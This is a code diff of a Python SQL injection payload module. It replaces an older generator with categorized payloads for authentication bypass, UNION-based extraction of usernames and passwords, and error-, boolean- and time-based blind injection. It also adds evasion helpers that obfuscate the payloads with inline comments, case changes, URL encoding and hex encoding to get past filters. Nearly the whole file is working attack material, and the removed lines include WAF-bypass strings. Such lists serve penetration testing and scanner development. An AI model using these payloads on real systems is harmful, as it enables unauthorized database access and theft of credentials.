@@ -1,29 +1,63 @@
-def generate_sqli():
-    """
-    Generates a list of SQL Injection payloads, including union-based, error-based, and blind techniques.
-    """
-    payloads = [
-        # Basic SQLi payloads
-        "' OR '1'='1",
-        "' OR 1=1 -- -",
-        "admin'--",
+# Unified SQLi Payload Module
+# Contributed by Hafsa & Abdul Haseeb - July 2025
 
-        # Union-based attacks
-        "' UNION SELECT null, table_name FROM information_schema.tables -- -",
-        "' UNION SELECT 1, concat(username, ':', password) FROM users -- -",
+import urllib.parse
 
-        # Error-based SQLi
-        "' AND extractvalue(rand(), concat(0x3a, version())) -- -",
-        "' AND updatexml(null, concat(0x3a, version()), null) -- -",
-
-        # Blind SQLi
-        "' AND SLEEP(5) -- -",
-        "' AND IF(SUBSTRING(version(), 1, 1)='5', SLEEP(5), 1) -- -",
-
-        # WAF bypass examples
-        "UNION/*!50000SELECT*/ 1, 2",
-        "id=1+UnIoN+SeLeCt+1,2",
-        "1' /*!50000OR*/ '1'='1",
-        "1' /*!50000OR*/ 1=1 -- -"
+# Categorized Payloads (from Abdul Haseeb)
+payload_categories = {
+    "auth": [
+        "' OR '1'='1'  --",
+        "' OR 'a'='a",
+        "' OR '' = '"
+    ],
+    "union": [
+        "' UNION SELECT NULL--",
+        "' UNION SELECT username, password FROM users--",
+        "' UNION SELECT 1,2,3--"
+    ],
+    "error": [
+        "' AND 1=CONVERT(int, (SELECT @@version))--",
+        "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--"
+    ],
+    "bool": [
+        "' AND 1=1--",
+        "' AND 1=2--"
+    ],
+    "time": [
+        "'; WAITFOR DELAY '0:0:5'--",
+        "' OR SLEEP(5)#"
     ]
-    return payloads
+}
+
+# Evasion helpers (from Hafsa)
+def encode_payload(payload, method="url"):
+    if method == "url":
+        return urllib.parse.quote(payload)
+    elif method == "hex":
+        return ''.join(f"\\x{ord(c):02x}" for c in payload)
+    else:
+        return payload
+
+def obfuscate_with_comments(payload):
+    return payload.replace(" ", "/**/")
+
+# Core Generation Functions
+def get_payloads_by_type(category, evasion=False):
+    payloads = payload_categories.get(category, [])
+    return _apply_evasion(payloads) if evasion else payloads
+
+def get_all_payloads(evasion=False):
+    all_payloads = []
+    for payload_list in payload_categories.values():
+        all_payloads.extend(payload_list)
+    return _apply_evasion(all_payloads) if evasion else all_payloads
+
+def _apply_evasion(payloads):
+    evaded = []
+    for p in payloads:
+        evaded.append(p)
+        evaded.append(obfuscate_with_comments(p))
+        evaded.append(p.upper())
+        evaded.append(encode_payload(p, method="url"))
+        evaded.append(encode_payload(p, method="hex"))
+    return evaded
